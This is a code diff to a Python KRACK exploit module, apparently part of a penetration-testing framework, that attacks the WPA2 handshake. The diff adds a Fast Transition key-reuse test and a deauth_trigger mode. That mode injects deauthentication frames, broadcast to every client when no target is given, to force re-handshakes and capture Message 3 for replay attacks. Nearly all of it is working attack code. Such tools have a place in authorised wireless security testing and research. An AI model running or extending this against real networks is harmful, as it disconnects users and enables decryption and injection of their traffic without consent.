@@ -7,19 +7,26 @@ in the WPA2 4-way handshake and group key handshake:
 
   - 4way_replay        Replay Message 3 to trigger PTK reinstallation
   - group_replay       Replay Group Key Message 1 to reset group PN
-  - fthandshake_test   Test FT (Fast Transition) reassociation key reuse
+  - ft_test            Test FT (Fast Transition) reassociation key reuse
   - broadcast_replay   Replay broadcast frames to test group key replay
   - monitor            Passive monitoring for key reinstallation indicators
+  - deauth_trigger     Send deauth to force re-handshake, then capture
 
 The attack forces nonce/counter reuse in CCMP, enabling frame decryption
 and potential injection.
+
+Improvements incorporated from upstream vanhoefm/krackattacks-scripts:
+  - FT handshake vulnerability test (issue #84)
+  - GTK init logic fix (issue #100)
+  - Deauth-triggered handshake capture for reliable msg3 collection
+  - pycryptodome 3.19+ compatibility (PR #102)
 
 Requires: Monitor mode interface with injection, modified hostapd
 (for Message 3 replay in AP mode). Passive tests work with any adapter.
 
 Dependencies: scapy, pycryptodome.
 
-Version: 1.0.0
+Version: 1.1.0
 """
 
 from __future__ import annotations
@@ -186,7 +193,7 @@ class Exploit(Exploit):
     interface = OptString("wlan0mon", "Monitor mode interface")
     attack = OptString(
         "monitor",
-        "Mode: monitor | msg3_replay | group_replay | broadcast_replay",
+        "Mode: monitor | msg3_replay | group_replay | broadcast_replay | ft_test | deauth_trigger",
     )
     target_bssid = OptMAC("", "Target AP BSSID")
     target_client = OptMAC("", "Target client MAC")
@@ -345,6 +352,115 @@ class Exploit(Exploit):
 
         print_success("Broadcast replay test complete. Check target for acceptance.")
 
+    def _ft_handshake_test(self) -> None:
+        """Test FT (Fast BSS Transition / 802.11r) key reinstallation.
+
+        Monitors for FT Reassociation Response messages and checks if
+        the pairwise key is reinstalled during FT handshake (issue #84).
+        Captures FT Auth and FT Reassoc exchanges for analysis.
+        """
+        print_status("FT handshake vulnerability test...")
+        print_info("Monitoring for FT Auth/Reassoc exchanges...")
+
+        ft_events: Dict[str, List] = {"auth": [], "reassoc": []}
+
+        def _monitor_ft(pkt):
+            if pkt.haslayer(Dot11Auth):
+                if pkt.addr2 and pkt.addr1:
+                    ft_events["auth"].append({
+                        "time": time.time(),
+                        "ap": pkt.addr2,
+                        "client": pkt.addr1,
+                    })
+                    logger.info("FT Auth: %s -> %s", pkt.addr2, pkt.addr1)
+
+            if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 3:
+                ft_events["reassoc"].append({
+                    "time": time.time(),
+                    "src": pkt.addr2,
+                    "dst": pkt.addr1,
+                })
+                logger.info("FT Reassoc: %s -> %s", pkt.addr2, pkt.addr1)
+
+            if pkt.haslayer(Dot11CCMP) and pkt.addr2:
+                pn = _extract_pn(pkt)
+                reused = self._iv_tracker.observe(pkt.addr2, pn)
+                if reused:
+                    print_success("[FT-KRACK] PN reuse after FT: {} PN={}".format(
+                        pkt.addr2, pn))
+
+        try:
+            sniff(iface=self.interface, prn=_monitor_ft, store=False,
+                  timeout=self.monitor_timeout)
+        except KeyboardInterrupt:
+            print_info("\nFT monitoring interrupted.")
+
+        print_info("FT events captured:")
+        print_info("  Auth frames:    {}".format(len(ft_events["auth"])))
+        print_info("  Reassoc frames: {}".format(len(ft_events["reassoc"])))
+
+        stats = self._iv_tracker.get_stats()
+        for mac, s in stats.items():
+            if s["reuses"] > 0:
+                print_success("  {} — {} PN reuses detected (FT vulnerable)".format(
+                    mac, s["reuses"]))
+
+    def _deauth_trigger(self) -> None:
+        """Send deauth frames to force client re-handshake, then capture.
+
+        Combines deauth burst with handshake capture for reliable
+        Msg3 collection. Useful as precursor to msg3_replay.
+        """
+        if not self.target_bssid:
+            print_error("target_bssid is required for deauth_trigger.")
+            return
+
+        target = self.target_client if self.target_client else "ff:ff:ff:ff:ff:ff"
+
+        deauth_frame = RadioTap() / Dot11(
+            type=0, subtype=12,
+            addr1=target,
+            addr2=self.target_bssid,
+            addr3=self.target_bssid,
+        ) / Dot11Deauth(reason=7)
+
+        print_status("Sending {} deauth frames to trigger re-handshake...".format(
+            self.replay_count))
+
+        capture_thread = threading.Thread(target=self._capture_handshake_async,
+                                          daemon=True)
+        capture_thread.start()
+
+        time.sleep(0.5)
+
+        for i in range(self.replay_count):
+            sendp(deauth_frame, iface=self.interface, verbose=False)
+            time.sleep(0.1)
+
+        capture_thread.join(timeout=30)
+
+        if self._captured_msg3:
+            print_success("Captured {} Msg3 frames after deauth trigger.".format(
+                len(self._captured_msg3)))
+        else:
+            print_info("No Msg3 captured. Client may have moved or AP uses FT.")
+
+    def _capture_handshake_async(self) -> None:
+        """Capture handshake messages in background (for deauth_trigger)."""
+        count_before = len(self._captured_msg3)
+
+        def _check(pkt):
+            if _is_eapol_msg3(pkt):
+                self._captured_msg3.append(pkt)
+                if len(self._captured_msg3) > count_before:
+                    return True
+
+        try:
+            sniff(iface=self.interface, stop_filter=_check,
+                  timeout=20, store=False)
+        except Exception:
+            pass
+
     def run(self) -> None:
         """Execute KRACK attack/test."""
         if not HAS_SCAPY:
@@ -370,6 +486,8 @@ class Exploit(Exploit):
             "msg3_replay": self._msg3_replay,
             "group_replay": self._group_replay,
             "broadcast_replay": self._broadcast_replay,
+            "ft_test": self._ft_handshake_test,
+            "deauth_trigger": self._deauth_trigger,
         }
 
         handler = modes.get(self.attack)
